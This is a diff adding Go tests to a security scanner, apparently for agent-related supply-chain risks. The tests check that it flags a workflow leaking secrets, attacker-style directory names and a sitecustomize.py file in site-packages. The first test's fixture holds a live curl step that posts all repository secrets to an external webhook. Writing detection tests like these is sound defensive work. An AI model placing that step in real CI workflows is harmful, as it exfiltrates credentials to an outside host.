@@ -97,3 +97,51 @@ func containsString(s []string, want string) bool {
 	}
 	return false
 }
+
+func TestScannerFindsHadesWorkflowExfil(t *testing.T) {
+	root := t.TempDir()
+	wf := filepath.Join(root, ".github", "workflows", "exfil.yml")
+	require.NoError(t, os.MkdirAll(filepath.Dir(wf), 0o755))
+	require.NoError(t, os.WriteFile(wf, []byte(`
+on: push
+jobs:
+  exfil:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -X POST https://webhook.site/abc -d "${{ toJson(secrets) }}"
+`), 0o644))
+
+	res := agentsurface.New(agentsurface.Options{ProjectRoots: []string{root}}).Scan(context.Background())
+	var titles []string
+	for _, f := range res.Findings {
+		titles = append(titles, f.Title)
+	}
+	require.True(t, containsString(titles, "GitHub Actions workflow posts secrets to an external webhook (Hades exfil shape)"),
+		"missing exfil finding; got %v", titles)
+}
+
+func TestScannerFindsHadesAttackerDirNaming(t *testing.T) {
+	parent := t.TempDir()
+	root := filepath.Join(parent, "stygian-cerberus-evil")
+	require.NoError(t, os.MkdirAll(root, 0o755))
+	res := agentsurface.New(agentsurface.Options{ProjectRoots: []string{root}}).Scan(context.Background())
+	var titles []string
+	for _, f := range res.Findings {
+		titles = append(titles, f.Title)
+	}
+	require.True(t, containsString(titles, "Project directory name matches Hades / Shai-Hulud attacker naming"))
+}
+
+func TestScannerFlagsCustomizeInSitePackages(t *testing.T) {
+	root := t.TempDir()
+	site := filepath.Join(root, ".venv", "lib", "python3.11", "site-packages")
+	require.NoError(t, os.MkdirAll(site, 0o755))
+	require.NoError(t, os.WriteFile(filepath.Join(site, "sitecustomize.py"), []byte("# anything"), 0o644))
+
+	res := agentsurface.New(agentsurface.Options{ProjectRoots: []string{root}}).Scan(context.Background())
+	var titles []string
+	for _, f := range res.Findings {
+		titles = append(titles, f.Title)
+	}
+	require.True(t, containsString(titles, "Python sitecustomize.py present inside site-packages"))
+}
